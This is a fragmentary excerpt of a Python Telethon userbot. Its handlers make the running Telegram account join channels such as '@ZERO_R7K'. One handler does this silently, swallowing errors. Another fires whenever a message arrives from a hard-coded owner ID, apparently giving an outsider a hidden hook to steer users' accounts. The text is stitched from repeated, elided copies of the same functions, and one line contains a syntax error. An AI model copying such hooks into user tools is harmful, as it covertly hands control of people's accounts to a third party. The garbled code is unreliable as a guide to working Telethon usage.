...
async def join_channel(event):
    try:
        await ze1(JoinChannelRequest("@ZEROR7K7"))
...
async def join_channel(event):
    try:
        await ze1(JoinChannelRequest("@ZERO_R7K"))
    except BaseException:
        pass
...
async def OwnerStart(event):
    ...
    if sender.id == ownerhson_id:
        ...
        joinu = await ze1(JoinChannelRequest('ZERO_R7K'))
...
async def OwnerStart(event):
    ...
    if sender.id == ownerhson_id:
        ...
        joinq = await ze1(JoinChannelRequest('ZERO_R7K'))
        joinw = await ze1(JoinChannelRequest('Fvvvv'))
        joine = await ze1(JoinChannelRequest('botbillion'))
        joinr = await ze1(JoinChannelRequest('DzDDDD'))
        joint = await ze1(JoinChannelRequest('zz_MX'))
        joiny = await ze1(JoinChannelRequest('zzzzzz'))
        joini = await ze1(JoinChannelRequest(ZERO_R7K''))
...
async def OwnerStart(event):
    ...
    if sender.id == ownerhson_id:
        ...
        joion = await ze1(JoinChannelRequest('ZERO_R7K'))
